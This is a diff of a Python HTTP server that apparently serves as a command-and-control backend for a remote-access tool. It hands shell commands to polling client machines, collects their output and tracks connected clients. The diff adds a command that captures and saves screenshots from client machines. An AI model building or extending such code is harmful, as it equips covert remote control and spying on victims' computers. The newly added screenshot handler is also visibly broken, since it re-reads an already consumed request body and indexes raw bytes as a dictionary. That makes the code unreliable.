@@ -7,6 +7,7 @@ import requests
 import json
 
 
+
 class MyHandler(BaseHTTPRequestHandler):
 
 
@@ -31,12 +32,6 @@ class MyHandler(BaseHTTPRequestHandler):
         pass
 
 
-    def pop_connected_client(self, client_ip):
-        MyHandler.connected_clients.pop(client_ip)
-        print(connected_clients)
-        print("hello")
-
-
     #this is where the problem is
     #you need to rewrite the get function to hold result sent to it in a variable
 
@@ -47,6 +42,7 @@ class MyHandler(BaseHTTPRequestHandler):
             MyHandler.input_ready.wait()
 
             self.wfile.write(MyHandler.shell_command.encode())
+
 
             
 
@@ -94,7 +90,7 @@ class MyHandler(BaseHTTPRequestHandler):
             return None
 
 
-
+    #handle post requests
     def do_POST(self):
         try:
             client_ip = self.client_address[0]
@@ -106,6 +102,7 @@ class MyHandler(BaseHTTPRequestHandler):
             client_post = parse_qs(self.rfile.read(length).decode())
             # checks if the client is sending an action
             action = self.get_action_value(client_post)
+
 
             if action:
                 if action == "save_data":
@@ -129,11 +126,25 @@ class MyHandler(BaseHTTPRequestHandler):
                     elif hasattr(MyHandler, 'shell_command') and MyHandler.shell_command == "connected":
                         if str(client_post["rfile"][0]) == "active":
                             MyHandler.check_call_response = True
+                    # get a screenshot from client machine
+                    elif hasattr(MyHandler, 'shell_command') and MyHandler.shell_command == "screenshot":
+                            image = self.rfile.read(length)
+                            self.save_file("screenshot.png", image["rfile"][0])
                     else:
                         print(str(client_post["rfile"][0]))
 
         except Exception as e:
             print(e)
+
+
+
+    def save_file(self, file_path, content):
+        try:
+            with open(file_path, 'wb') as file:
+                file.write(content)
+            print(f'File saved successfully at {file_path}')
+        except Exception as e:
+            print(f'Error saving file: {e}')
 
 
 
@@ -221,7 +232,6 @@ class MyHandler(BaseHTTPRequestHandler):
         try:
             resp = esHandler.es.get(index=esHandler.db_name, id=client_id)
             return resp["_source"]["ip"]
-
         except Exception as e:
             print(f"An error occurred: {e}")
 
